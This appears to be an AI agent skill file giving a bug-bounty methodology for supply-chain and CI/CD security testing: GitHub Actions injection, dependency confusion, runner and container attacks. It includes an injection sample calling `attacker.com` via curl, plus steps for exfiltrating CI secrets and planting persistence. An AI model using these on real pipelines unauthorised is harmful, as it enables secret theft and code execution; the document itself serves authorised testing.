---
name: supply-chain-security
description: Supply chain and CI/CD pipeline security testing — GitHub Actions script injection, GitLab CI pipeline abuse, dependency confusion, package ecosystem attacks, artifact poisoning, release provenance, webhook abuse, container supply chain, and runner/agent trust boundaries. Trigger with "supply chain", "CI/CD", "GitHub Actions", "GitLab CI", "dependency confusion", "package", "artifact", "pipeline", "runner", "webhook", "container security", "SBOM", "SLSA", "typosquatting", "lockfile", "self-hosted runner", "build pipeline", "release signing", "provenance". For AI IDE supply chain (project file poisoning, extension squatting), use ai-hunting. For cloud CI/CD misconfiguration, use cloud-security. For source code review of pipeline configs, use source-code-audit.
---

# Supply Chain & CI/CD Security Testing

Supply chain attacks target the development and delivery pipeline rather than the application itself. These bugs consistently pay high bounties because they compromise trust boundaries that protect entire organizations — a single poisoned dependency or misconfigured pipeline can yield code execution across thousands of downstream systems.

## Quick Reference: What Pays

| Bug Class | Typical Severity | Avg Payout Range | Duplicate Risk |
|-----------|-----------------|------------------|----------------|
| GitHub Actions RCE via script injection | Critical | $5k–$30k+ | Low |
| Dependency confusion (internal pkg takeover) | Critical | $10k–$50k+ | Low |
| Self-hosted runner escape | Critical | $5k–$25k | Low |
| CI/CD credential exfiltration | High–Critical | $3k–$20k | Low–Medium |
| Artifact poisoning / unsigned releases | High | $2k–$15k | Low |
| Webhook SSRF / secret bypass | Medium–High | $1k–$10k | Medium |
| Container image supply chain | High | $2k–$15k | Low |
| Typosquatting / malicious package | High–Critical | $1k–$10k | Medium |
| Pipeline trigger abuse | Medium–High | $1k–$8k | Medium |

---

## 1. GitHub Actions Security

The largest CI/CD attack surface in bug bounties. Most orgs expose workflow files publicly in `.github/workflows/`.

> **Advanced exploitation patterns:** See [reference/github-actions-exploitation.md](reference/github-actions-exploitation.md) for AI-powered exploitation (hackerbot-claw), multi-stage supply chain chains (Shai-Hulud v2/v3), self-hosted runner deep exploitation, and hunt checklists.

### Script Injection via Untrusted Inputs

Attacker-controlled values interpolated directly into `run:` blocks execute arbitrary commands.

| # | Dangerous Input | Injection Vector | CWE |
|---|----------------|------------------|-----|
| 1 | `github.event.issue.title` | Crafted issue title with backtick commands | CWE-78 |
| 2 | `github.event.issue.body` | Issue body with `$(curl attacker.com)` | CWE-78 |
| 3 | `github.event.pull_request.title` | PR title injected into shell | CWE-78 |
| 4 | `github.event.comment.body` | Comment body in `run:` step | CWE-78 |
| 5 | `github.event.discussion.title` | Discussion title interpolation | CWE-78 |
| 6 | `github.head_ref` | Branch name with shell metacharacters | CWE-78 |

**Test procedure:**
1. Search target repos for `${{ github.event.` inside `run:` blocks in workflow YAML
2. Identify which event properties are attacker-controlled (issue title, PR title, branch name, comment body)
3. Create an issue/PR with title: `` `echo INJECTION_PROOF` `` or `$(echo INJECTION_PROOF)`
4. Check Actions logs for command execution evidence
5. Escalate: exfiltrate `GITHUB_TOKEN` or secrets via `env` dump to controlled endpoint

**Severity**: Critical (CWE-78, CVSS 9.8) — arbitrary command execution in CI context.

### GITHUB_TOKEN Scope Abuse

Default `GITHUB_TOKEN` permissions are often overly broad (`contents: write`, `packages: write`).

**Test procedure:**
1. Check workflow `permissions:` block — if absent, token has full repo scope
2. In `pull_request_target` workflows, token has write access to the base repo
3. Test if token can push to protected branches, create releases, or modify packages
4. Check for `persist-credentials: true` (default) in `actions/checkout` — token remains in `.git/config`

### pull_request_target Misuse

Workflows triggered by `pull_request_target` run in the context of the base repo with write permissions but can be tricked into checking out attacker-controlled PR code.

**Test procedure:**
1. Find workflows using `pull_request_target` that also run `actions/checkout` with `ref: ${{ github.event.pull_request.head.sha }}`
2. If checkout uses the PR head ref, attacker code runs with base repo permissions
3. Submit a PR modifying the workflow or scripts it executes — observe if changes run with elevated access

**CVE reference**: CVE-2022-29036 (Jenkins), similar class. See also: tj-actions/changed-files incident (March 2025) — compromised Action exfiltrated CI secrets from 23,000+ repos.

### Self-Hosted Runner Escape

Self-hosted runners that are not ephemeral retain state between jobs.

| # | Attack | Test | Impact |
|---|--------|------|--------|
| 1 | Credential harvesting | Check `_diag/`, `.credentials`, `.env` files post-job | Persistent access |
| 2 | Runner registration token theft | Extract `ACTIONS_RUNNER_INPUT_TOKEN` from process env | Register rogue runner |
| 3 | Shared filesystem abuse | Write to shared paths; next job reads attacker files | Lateral movement |
| 4 | Docker socket access | Check if `/var/run/docker.sock` is mounted | Container escape to host |
| 5 | Non-ephemeral persistence | Drop cron job or `.bashrc` payload | Persistent backdoor |

**Severity**: Critical (CWE-269) — runners often have access to production credentials and internal networks.

### Reusable Workflow & Composite Action Trust

Third-party Actions pinned by tag (not SHA) can be silently replaced.

**Test procedure:**
1. Audit `uses:` references — anything pinned to `@main`, `@v1`, or mutable tags is vulnerable
2. Check for Actions from unverified publishers or low-star repos
3. Test if the target uses `actions/checkout@v3` vs `actions/checkout@<full-sha>` — mutable tag allows supply chain substitution
4. Inspect composite actions for `post:` steps that persist after the main job

---

## 2. GitLab CI/CD

### Pipeline Trigger & Variable Exposure

| # | Attack | Test | CWE |
|---|--------|------|-----|
| 1 | CI variable leak via MR | Create MR, check if protected variables leak to MR pipelines | CWE-200 |
| 2 | `include: remote` injection | If `.gitlab-ci.yml` uses `include: remote:` with HTTP URL, MITM or domain takeover injects arbitrary pipeline config | CWE-829 |
| 3 | Trigger token abuse | Enumerate `/api/v4/projects/:id/triggers` — leaked tokens allow arbitrary pipeline runs | CWE-798 |
| 4 | Shared runner escape | Jobs on shared runners can access other projects' build artifacts if caching is misconfigured | CWE-269 |
| 5 | Pipeline variable injection | Trigger pipelines via API with injected `variables[]` that override script commands | CWE-78 |

**Test procedure:**
1. Fork a project and modify `.gitlab-ci.yml` to dump environment variables (`env | sort`)
2. Check if protected variables are exposed to non-protected branches
3. Search for `include: remote:` directives pointing to external domains — check domain registration status
4. Test pipeline trigger API with extra variables that override script commands

---

## 3. Dependency Confusion

Internal packages on private registries that share names with public packages are vulnerable to substitution.

### Attack Pattern

```
Target uses:    @internal/payment-sdk (private npm registry)
Attacker claims: payment-sdk on public npmjs.com with higher version
Result:         Build system fetches public (malicious) package
```

### Test Procedures

| # | Ecosystem | Test | Indicator |
|---|-----------|------|-----------|
| 1 | npm | Search `package.json` for unscoped package names, check if they exist on npmjs.com | Package names not prefixed with `@scope/` |
| 2 | npm | Check `.npmrc` for `registry=` config — if public registry is fallback, confusion is possible | Missing `@scope:registry=` scoped config |
| 3 | PyPI | Search `requirements.txt` / `setup.py` for internal-looking package names | Names like `company-utils`, `internal-auth` |
| 4 | Maven | Check `pom.xml` for custom `groupId` values; verify if they exist on Maven Central | Unclaimed groupId on public repo |
| 5 | Go | Check `go.mod` for private module paths with no `GONOSUMDB`/`GOPRIVATE` set | Private modules fetched from public proxy |

**CVE reference**: CVE-2021-23727 (Celery dependency confusion). Alex Birsan's 2021 research disclosed $130k+ in bounties from Microsoft, Apple, PayPal.

**Severity**: Critical (CWE-427) — arbitrary code execution in build/production environments.

### Scoped Package Attacks

Even scoped packages (`@company/pkg`) are vulnerable if:
- The org scope is not claimed on the public registry
- `.npmrc` routes scoped packages to the public registry by default
- Proxy registries (Artifactory, Nexus) have "remote repository" fallback enabled for the scope

---

## 4. Package Ecosystem Attacks

### Typosquatting & Install Script Backdoors

| # | Signal | Detection Method | CWE |
|---|--------|-----------------|-----|
| 1 | `preinstall` / `postinstall` scripts | `npm show <pkg> scripts` — legitimate packages rarely need install hooks | CWE-506 |
| 2 | Obfuscated code in install scripts | Base64 decoding, `eval()`, `Buffer.from()` chains in `scripts/` | CWE-506 |
| 3 | Recent name claim on abandoned package | Check npm publish date vs download count — recent publish + high downloads = hijack | CWE-427 |
| 4 | Typosquat variants | Check for `lodash` vs `1odash`, `requests` vs `request` | CWE-427 |
| 5 | Lockfile injection | Modified `package-lock.json` / `yarn.lock` pointing to attacker registry | CWE-829 |

**Test procedure:**
1. Audit target's `package.json` for all dependencies — cross-reference publish dates and maintainer accounts
2. Run `npm audit` and check for known advisories
3. Inspect lockfiles for `resolved` URLs pointing outside expected registries
4. Check if lockfile integrity hashes (`integrity` field) match published package hashes

**CVE references**: ua-parser-js hijack (CVE-2021-43831, 8M weekly downloads compromised), event-stream incident (CVE-2018-16492), colors.js sabotage.

**Feb 2026 supply chain wave:**
- **StripeApi.Net** (Feb 16): NuGet typosquat of legitimate Stripe.net package — targets .NET payment integrations
- **Cline CLI NPM compromise** (Feb 17): stolen publish token → postinstall script installing OpenClaw agent on developer machines; affected AI coding tool ecosystem
- **Claude Code CVE-2026-21852** (Jan 2026, CVSS 5.3): information disclosure in project-load flow — malicious repository exfiltrates data including API keys; fixed in v2.0.65. Pattern: AI coding tools loading untrusted project configs

**Group-IB 2026**: 68% of severe incidents now linked to supply chain compromise — nearly double from prior years. **Snyk ToxicSkills**: 36% of 3,984 AI agent skills audited contain security flaws; 100% of malicious skills use dual-vector attack (code malware + prompt injection simultaneously).

---

## 5. Artifact Poisoning

CI/CD artifacts (build outputs, binaries, container images) can be substituted if integrity verification is missing.

### Test Patterns

| # | Attack | Test | CWE |
|---|--------|------|-----|
| 1 | Unsigned release binaries | Download release assets — check for GPG signatures, Sigstore cosign attestations | CWE-345 |
| 2 | Container image tag mutability | `docker pull image:latest` at different times — compare `sha256` digests | CWE-345 |
| 3 | Artifact upload from forked PRs | If CI uploads artifacts from PR builds, attacker fork can poison artifacts | CWE-345 |
| 4 | SBOM gaps | Request SBOM — check for missing transitive dependencies or unsigned components | CWE-1059 |
| 5 | GitHub release asset substitution | Check if release contributors can overwrite existing assets | CWE-345 |

**Test procedure:**
1. Download official release artifacts and check for `.sig`, `.asc`, or cosign attestation files
2. Verify that container images are referenced by digest (`@sha256:...`) not just tag
3. For GitHub releases, check if the release was created by a maintainer vs a contributor
4. Test `actions/upload-artifact` in PR workflows — can forked PRs overwrite artifact names?

---

## 6. Release Pipeline & Provenance

### SLSA Verification Gaps

| SLSA Level | Requirement | What to Test |
|------------|-------------|--------------|
| L1 | Build process exists | Is there any CI/CD at all? Manual releases = no provenance |
| L2 | Hosted build, signed provenance | Check for SLSA provenance attestation (`slsa-verifier verify-artifact`) |
| L3 | Hardened build, non-falsifiable provenance | Can the build be triggered from outside the repo? Are build parameters user-controlled? |

**Test procedure:**
1. Check releases for SLSA provenance bundles (`.intoto.jsonl`, `.sigstore` files)
2. If provenance exists, verify with `slsa-verifier` — check `builder.id` and `buildType` fields
3. Look for signing key exposure: search repos for `.gpg`, `cosign.key`, `SIGNING_KEY` in CI variables
4. Check if deployment credentials (Docker Hub, PyPI tokens) are in workflow environment variables vs. OIDC

**CVE reference**: CVE-2024-3094 (xz-utils backdoor) — social engineering of maintainer trust to inject build-time backdoor, CVSS 10.0. SolarWinds Orion (CVE-2020-10148) — build pipeline compromise.

**Severity**: Critical (CWE-494) — compromised build provenance undermines all downstream trust.

---

## 7. Webhook Abuse

Webhooks bridge CI/CD systems to external services and are frequently misconfigured.

### Test Patterns

| # | Attack | Test | CWE |
|---|--------|------|-----|
| 1 | Missing secret validation | Send crafted POST to webhook URL without HMAC signature — if accepted, no validation | CWE-345 |
| 2 | Replay attacks | Capture legitimate webhook payload, replay it — check for timestamp validation | CWE-294 |
| 3 | SSRF via webhook URL | If users configure webhook target URLs, set to internal IPs (`169.254.169.254`, `127.0.0.1`) | CWE-918 |
| 4 | Unauthenticated endpoints | Enumerate `/webhooks`, `/api/hooks`, `/notify` endpoints — test without auth | CWE-306 |
| 5 | Webhook payload injection | If webhook data triggers CI builds, inject shell commands in payload fields | CWE-78 |

**Test procedure:**
1. Identify webhook endpoints from API docs, source code, or configuration files
2. Send POST with valid structure but no signature header — check if processed
3. If HMAC validation exists, check for timing side channels in signature comparison
4. Test webhook URL configuration for SSRF: set target to metadata endpoints or internal services
5. Check if webhook payloads are logged in plaintext (secret exposure in CI logs)

---

## 8. Container Supply Chain Security

### Base Image & Registry Attacks

| # | Attack | Test | CWE |
|---|--------|------|-----|
| 1 | Unpinned base images | Check `Dockerfile` for `FROM image:latest` vs `FROM image@sha256:...` | CWE-829 |
| 2 | Dockerfile secret exposure | Search for `ARG`, `ENV` with credentials, API keys, tokens in build layers | CWE-798 |
| 3 | Registry misconfiguration | Test anonymous pull/push: `docker pull target-registry.com/app:latest` | CWE-306 |
| 4 | Multi-stage build leaks | Check if final stage copies files from build stages that contain secrets | CWE-200 |
| 5 | Distroless bypass | Even distroless images may contain debug variants or writable paths | CWE-269 |
| 6 | Layer history inspection | `docker history --no-trunc image:tag` — reveals build commands including secrets | CWE-200 |

**Test procedure:**
1. Pull public container images for the target and inspect layers: `docker save image | tar -xf -`
2. Check each layer for secrets: API keys, certificates, SSH keys, `.env` files
3. Inspect `docker history` for `ARG`/`ENV` commands that embed credentials
4. Test container registries for anonymous push access
5. Check if images are signed with Docker Content Trust or cosign

**CVE reference**: CVE-2024-21626 (runc container escape, CVSS 8.6) — `WORKDIR` directive allowed host filesystem access via `/proc/self/fd/` symlinks.

---

## 9. Runner & Build Agent Trust

### Self-Hosted Runner Risks

| Risk | Ephemeral | Persistent | Test |
|------|-----------|------------|------|
| Credential persistence | Low | Critical | Check if `~/.docker/config.json`, `~/.aws/credentials` survive between jobs |
| Lateral movement | Low | High | Test if runner has network access to internal services, databases |
| Privilege escalation | Medium | High | Check if runner process runs as root, has docker group membership |
| Supply chain pivot | Medium | Critical | If runner builds packages, can a malicious job tamper with build outputs for future jobs? |

**Test procedure:**
1. In a permitted CI job, enumerate: filesystem paths, network access, mounted volumes, environment variables
2. Check if previous job artifacts or credentials remain on disk
3. Test if the runner has access to cloud metadata endpoints (`169.254.169.254`)
4. Check Docker-in-Docker configurations — socket mount vs rootless DinD
5. Verify that runner registration tokens are not exposed in repo settings or CI logs

---

## Severity Assessment Reference

| Finding | CVSS Range | CWE | Key Factor |
|---------|-----------|-----|------------|
| Actions script injection to RCE | 9.8 | CWE-78 | Arbitrary code exec in CI |
| Dependency confusion to code exec | 9.1–9.8 | CWE-427 | Affects build + possibly prod |
| Self-hosted runner escape | 8.5–9.8 | CWE-269 | Access to production secrets |
| `pull_request_target` write abuse | 8.1–9.1 | CWE-863 | Write access to base repo |
| Unsigned artifacts / tag mutability | 7.5–8.5 | CWE-345 | Integrity of release pipeline |
| CI variable exposure | 6.5–8.5 | CWE-200 | Depends on variable sensitivity |
| Webhook secret bypass | 5.0–7.5 | CWE-345 | Impact depends on webhook action |
| Container registry anon access | 6.5–8.5 | CWE-306 | Read vs write access |
| Lockfile injection | 7.5–8.5 | CWE-829 | Build-time code execution |

---

## Validation Gate — Is This Submittable?

Before writing the report, check these supply-chain-specific false positives:

| Looks Like a Bug | Why It Usually Isn't |
|---|---|
| Workflow uses `pull_request` with write permissions | `pull_request` runs on the fork's code with read-only access by default — only `pull_request_target` gives write access to base repo |
| Third-party Action used without pinning to SHA | Informational risk — only a finding if you can demonstrate a realistic supply chain attack path (Action is unmaintained, attacker-controllable, or widely used) |
| CI secret visible in workflow logs | Verify the secret is real and grants access — many are masked or rotated; demonstrate what the secret unlocks |
| Container registry allows anonymous pull | Public pull is often intentional (open-source images) — only a finding if anonymous push is possible or images contain secrets |
| Dependency confusion possible (internal name matches public) | Must demonstrate that the build system actually resolves from the public registry — theoretical name collision alone is not a finding |
| Lockfile not present or not enforced | Informational unless you can demonstrate a practical supply chain attack via dependency resolution |

**Common mistakes in supply-chain reports:**
- Reporting `GITHUB_TOKEN` permissions as overly broad without demonstrating exploitation of the excess scope
- Confusing `pull_request` (safe) with `pull_request_target` (dangerous) trigger events
- Claiming dependency confusion without verifying the target's registry resolution order
- Submitting stale/unmaintained dependency as a finding without a working exploit
- Reporting CI misconfigurations on repos that don't run in production environments

**Severity calibration:** Theoretical dependency confusion = Low. CI script injection → RCE = Critical. Anonymous registry push = High-Critical. Workflow secret leak → production access = Critical. `pull_request_target` with checkout of PR code + secret access = Critical.

---

## How to Use This Skill

### With a Target
Give me a target repo URL or org name and I will:
1. Enumerate public workflow files and CI configuration
2. Audit for script injection, token scope, and third-party Action trust
3. Check dependency files for confusion and typosquatting risk
4. Assess release pipeline provenance and artifact integrity
5. Test webhook endpoints and container registry access

### Without a Target
Ask about any specific attack class and I will provide the full methodology, test procedures, and real-world examples.

---

## Related Skills

- **source-code-audit** — Find hardcoded secrets, unsafe deserialization, and injection sinks in CI scripts
- **cloud-security** — Cloud credential exposure via CI/CD, metadata endpoint access from runners
- **api-security** — API-level testing for webhook endpoints and registry APIs
- **vuln-patterns** — SSRF patterns for webhook abuse, injection patterns for CI script attacks
- **target-recon** — Discover CI/CD infrastructure, public workflow files, container registries
- **ai-hunting** → `reference/ide-supply-chain.md` — IDE extension supply chain attacks (VS Code marketplace, JetBrains plugin poisoning, RoguePilot, 24 AI IDE CVEs)
